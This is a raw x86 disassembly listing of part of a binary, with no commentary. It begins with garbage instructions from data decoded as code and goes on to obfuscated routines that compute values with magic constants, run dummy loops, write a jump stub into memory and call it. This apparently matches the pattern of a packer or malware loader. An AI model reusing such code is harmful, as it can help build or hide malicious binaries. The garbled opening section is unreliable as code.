  416b90:	ds cld 
  416b92:	aad    0x10
  416b94:	pop    ebp
  416b95:	and    ebp,DWORD PTR [ebx]
  416b97:	outs   dx,DWORD PTR ds:[esi]
  416b99:	shr    BYTE PTR [ecx-0x32],cl
  416b9c:	call   0xc3d98553
  416ba1:	or     BYTE PTR [edi+0x64],bh
  416ba4:	inc    edi
  416ba5:	fadd   st(5),st
  416ba7:	and    al,0xe4
  416ba9:	adc    bl,al
  416bab:	test   al,0xc
  416bad:	xchg   ebp,eax
  416bae:	jns    0x416b74
  416bb0:	shr    BYTE PTR cs:[esi+0x6e6bed8e],cl
  416bb7:	cdq    
  416bb8:	fidiv  DWORD PTR [edi+0x46]
  416bbb:	mov    bh,0xb4
  416bbd:	(bad)  
  416bbe:	outs   dx,DWORD PTR ds:[esi]
  416bbf:	push   0x99f2483
  416bc4:	pop    esp
  416bc5:	jno    0x416baf
  416bc7:	mov    ah,0x6e
  416bc9:	xor    ebp,DWORD PTR [edi]
  416bcb:	pop    ebx
  416bcc:	adc    al,0xe9
  416bce:	adc    eax,0x63e9fe1d
  416bd3:	jne    0x416c12
  416bd5:	pop    es
  416bd6:	jp     0x416bf3
  416bd8:	jmp    0x416be7
  416bda:	mov    ecx,0x58fde953
  416bdf:	enter  0x43ec,0x63
  416be3:	sub    ah,BYTE PTR [ebp+eax*4-0x4b]
  416be7:	leave  
  416be8:	(bad)
  416beb:	lock not BYTE PTR [esi-0x58]
  416bef:	out    dx,al
  416bf0:	out    0x31,eax
  416bf2:	mov    ch,BYTE PTR [eax-0x16e5cf38]
  416bf8:	fiadd  WORD PTR ds:0xdbaacb68
  416bfe:	call   0x91a827c9
  416c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c04:	mov    dl,BYTE PTR [eax+0x3ecb1b90]
  416c0a:	cdq    
  416c0b:	fnsave [ebx]
  416c0d:	call   0x98c50eb5
  416c12:	imul   esi,DWORD PTR [esi],0x3
  416c15:	dec    ebp
  416c16:	adc    BYTE PTR [ebx+0x22],cl
  416c19:	out    dx,al
  416c1a:	inc    edx
  416c1b:	and    BYTE PTR [edx+0x60],dh
  416c1e:	or     DWORD PTR [edx+0x66],ebx
  416c21:	mov    ecx,0x2c16d73a
  416c26:	test   BYTE PTR [esi],cl
  416c28:	xchg   DWORD PTR [edi-0x42],ecx
  416c2b:	ins    DWORD PTR es:[edi],dx
  416c2c:	xchg   ebx,eax
  416c2d:	add    esp,ebx
  416c2f:	mov    DWORD PTR [edx+0x4e],esp
  416c32:	pop    esp
  416c33:	or     al,0xb8
  416c35:	ror    BYTE PTR ds:0x8b84e274,1
  416c3b:	cmp    ch,bl
  416c3d:	mov    edx,0xd5e90c63
  416c42:	and    BYTE PTR [edi-0x19615934],ah
  416c48:	mov    edi,0xd5974942
  416c4d:	add    DWORD PTR [esi],0xd84b5e87
  416c53:	jnp    0x416c80
  416c55:	push   esp
  416c56:	push   0x3bbc969f
  416c5b:	and    BYTE PTR [edx-0x542c3072],bl
  416c61:	arpl   WORD PTR [ebp-0x37de0e19],si
  416c67:	xor    eax,0xb39200b2
  416c6c:	vpcmpgtd ymm0,ymm2,YMMWORD PTR [edx]
  416c70:	sbb    ebx,DWORD PTR [eax]
  416c72:	xor    eax,0x81e03133
  416c77:	push   eax
  416c78:	xchg   esi,eax
  416c79:	mov    ecx,0x812e1645
  416c7e:	mov    ss,WORD PTR [edx+0x75]
  416c81:	jecxz  0x416c49
  416c83:	test   eax,0x6aeeb633
  416c88:	enter  0x66e6,0x24
  416c8c:	mov    ebp,0xcbfa4e55
  416c91:	jae    0x416c80
  416c93:	pushf  
  416c94:	mov    al,0x3d
  416c96:	cmp    bl,BYTE PTR [esi-0x8]
  416c99:	ins    BYTE PTR es:[edi],dx
  416c9a:	xlat   BYTE PTR ds:[ebx]
  416c9b:	arpl   WORD PTR [ebp-0xf],si
  416c9e:	adc    al,BYTE PTR [eax]
  416ca0:	xor    edx,ebx
  416ca2:	fst    QWORD PTR [esi-0x5310229]
  416ca8:	rcr    ah,0x11
  416cab:	and    ah,BYTE PTR [eax+0x38]
  416cae:	aad    0xc8
  416cb0:	cmp    ebx,DWORD PTR ds:0x5cdc08b1
  416cb6:	mov    dh,0xf8
  416cb8:	repz mov fs,edi
  416cbb:	cmc    
  416cbc:	mov    ds:0xd6a13588,eax
  416cc1:	xchg   ebp,eax
  416cc2:	daa    
  416cc3:	xor    edx,edx
  416cc5:	cmp    edx,DWORD PTR [ecx-0x7580c722]
  416ccb:	xor    eax,DWORD PTR [edi-0x77]
  416cce:	addr16 adc al,bl
  416cd1:	mov    ebx,DWORD PTR [ebp-0x8]
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428cf1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af55
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428cfd
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d51
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d65
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d65
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
